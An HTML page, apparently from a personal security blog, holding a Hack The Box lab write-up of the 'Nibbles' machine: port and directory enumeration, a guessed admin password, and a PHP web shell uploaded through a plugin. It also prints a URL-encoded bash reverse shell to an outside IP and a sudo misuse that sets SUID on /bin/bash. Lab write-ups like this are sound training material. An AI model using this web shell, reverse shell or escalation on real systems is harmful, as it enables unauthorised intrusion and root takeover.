@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>Nibbles - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>Nibbles</h1>
+<div class="writeup-tags"><span class="tag tag-hack-the-box">Hack The Box</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-file-upload">File Upload</span> <span class="tag tag-rce">RCE</span> <span class="tag tag-sudo">Sudo</span> <span class="tag tag-suid">SUID</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://app.hackthebox.com/machines/Nibbles"><strong>Nibbles</strong></a> machine from the <a href="https://www.hackthebox.com/"><strong>Hack The Box</strong></a> platform. In this case, I&#39;ll be accessing a web pannel with trivial credentials, getting a reverse shell by exploiting a File Upload vuln and finally, privesc due to a sudo misconfiguration.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address and operating system of the machine, we need to enumerate as  much information as possible about the host.</p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.15.145 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 13:48 CET
+Initiating SYN Stealth Scan at 13:48
+Scanning 10.129.15.145 [65535 ports]
+Discovered open port 22/tcp on 10.129.15.145
+Discovered open port 80/tcp on 10.129.15.145
+Completed SYN Stealth Scan at 13:49, 20.96s elapsed (65535 total ports)
+Nmap scan report for 10.129.15.145
+Host is up, received user-set (0.11s latency).
+Scanned at 2026-01-31 13:48:54 CET for 21s
+Not shown: 49335 closed tcp ports (reset), 16198 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
+           Raw packets sent: 102958 (4.530MB) | Rcvd: 49897 (1.996MB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p22,80 10.129.15.145 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 14:49 CET
+Nmap scan report for 10.129.15.145
+Host is up (0.26s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
+</code></pre>
+<p>Nmap found some open ports. The intrusion is probably going to be, or at least start, from port 80. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s <a href="https://pwnerguy.github.io/enumeration-cheatsheet/">Enumeration Cheat Sheet</a>, which includes a table mapping service versions to possible operating system versions. We are facing an <strong>Ubuntu Xenial (16.04)</strong></p>
+<p>We can&#39;t do much with the SSH service since we don&#39;t have credentials yet. Now it&#39;s time to enumerate the web server running on the port 80.</p>
+<pre><code>❯ whatweb 10.129.15.145:80
+http://10.129.15.145:80 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.15.145]
+</code></pre>
+<p><img src="/assets/images/nibbles/web.png" alt=""></p>
+<p>Nothing interesting in the web, but in the source there is one comment.</p>
+<pre><code class="language-html">&lt;b&gt;Hello world!&lt;/b&gt; 
+
+
+&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
+</code></pre>
+<pre><code>❯ whatweb 10.129.15.145:80/nibbleblog/
+http://10.129.15.145:80/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.15.145], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
+</code></pre>
+<p><img src="/assets/images/nibbles/blog.png" alt=""></p>
+<p>This is a sort of a blog that is using technologies such as PHP, jQuery, RSS, Nibbleblog... It has nothing interesting in the web or source code, so we now need to fuzz as much as we can.</p>
+<blockquote>
+<p><strong>Nibbleblog</strong> is a blog platform that uses XML databases as opposed to MySQL and others. It is small, weighing in at less than half a megabyte and easy to install.</p>
+</blockquote>
+<pre><code>❯ gobuster dir -u http://10.129.15.188/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 30 -x php
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.15.188/nibbleblog/
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 2987]
+/sitemap.php          (Status: 200) [Size: 402]
+/content              (Status: 301) [Size: 327] [--&gt; http://10.129.15.188/nibbleblog/content/]
+/themes               (Status: 301) [Size: 326] [--&gt; http://10.129.15.188/nibbleblog/themes/]
+/feed.php             (Status: 200) [Size: 302]
+/admin                (Status: 301) [Size: 325] [--&gt; http://10.129.15.188/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]
+/plugins              (Status: 301) [Size: 327] [--&gt; http://10.129.15.188/nibbleblog/plugins/]
+/install.php          (Status: 200) [Size: 78]
+/update.php           (Status: 200) [Size: 1622]
+/README               (Status: 200) [Size: 4628]
+/languages            (Status: 301) [Size: 329] [--&gt; http://10.129.15.188/nibbleblog/languages/]
+Progress: 175324 / 175324 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p><img src="/assets/images/nibbles/nibbleblog_version.png" alt=""></p>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<p>We got the <strong>Nibbleblog&#39;s version</strong> from the <code>README</code> file and an interesting <code>admin.php</code> file which is a login page that blocks us after failing some loggin attempts. Also, the <em>Forgot password</em> button doesn&#39;t work. The file <code>/nibbleblog/content/private/users.xml</code> confirms that the admin user is &quot;admin&quot;. If you take a look at the <code>config.xml</code> file you&#39;ll see some email addresses and the name of the machine. Could <code>nibbles</code> be the admin&#39;s password? The answer is <strong>yes</strong>, the platform uses trivial credentials.</p>
+<p>We gathered information and finally figured out the credentials. Just because Nibbleblog&#39;s version is 4 and we have logged in I will not try the SQLi, besides I&#39;ll not try the Metasploit File Upload, since I want to do it manually.</p>
+<pre><code>❯ searchsploit nibble
+--------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                               |  Path
+--------------------------------------------------------------------------------------------- ---------------------------------
+Nibbleblog 3 - Multiple SQL Injections                                                       | php/webapps/35865.txt
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                        | php/remote/38489.rb
+--------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p><img src="/assets/images/nibbles/file_upload.png" alt=""></p>
+<hr>
+<h2>Exploitation</h2>
+<p>Since it has a Plugin that allow us to upload files, I can try to upload a simple PHP file to get a RCE to execute commands on the machine and after uploading it, I need to find where this file is.</p>
+<pre><code class="language-php">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<p><img src="/assets/images/nibbles/rce.png" alt=""></p>
+<p>To get a reverse shell I&#39;ll execute this URL-encoded command: <code>bash -c &quot;bash -i &gt;%26 %2Fdev%2Ftcp%2F10.10.14.210%2F443 0&gt;%261&quot;</code> </p>
+<pre><code>❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.210] from (UNKNOWN) [10.129.15.188] 35662
+bash: cannot set terminal process group (1260): Inappropriate ioctl for device
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
+&lt;ml/nibbleblog/content/private/plugins/my_image$ whoami                      
+nibbler
+</code></pre>
+<hr>
+<h2>Post-Exploitation</h2>
+<p>I&#39;m <code>nibbler</code> which is the user with web server privileges. Let&#39;s get a TTY upgrade to get a better shell.</p>
+<pre><code>❯ script /dev/null -c bash
+ctrl+z
+❯ stty raw -echo; fg
+❯ reset xterm
+❯ export TERM=xterm
+❯ export SHELL=bash
+❯ stty rows 45 columns 184
+</code></pre>
+<pre><code>nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+<p><code>nibbler</code> can execute <code>/home/nibbler/personal/stuff/monitor.sh</code> as root. This script doesn&#39;t exist in the file system, because you need to unzip <code>/home/nibbler/personal.zip</code> to access <code>/home/nibbler/personal/stuff</code> and edit the <code>monitor.sh</code> script. I&#39;ll be adding at the beggining of the script the command <code>chmod +s /bin/bash</code> to make /bin/bash a SUID file and, that way, I&#39;ll be able to spawn a root shell.</p>
+<pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
+nibbler@Nibbles:/home/nibbler/personal/stuff$ /bin/bash -p
+bash-4.3# whoami
+root
+</code></pre>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
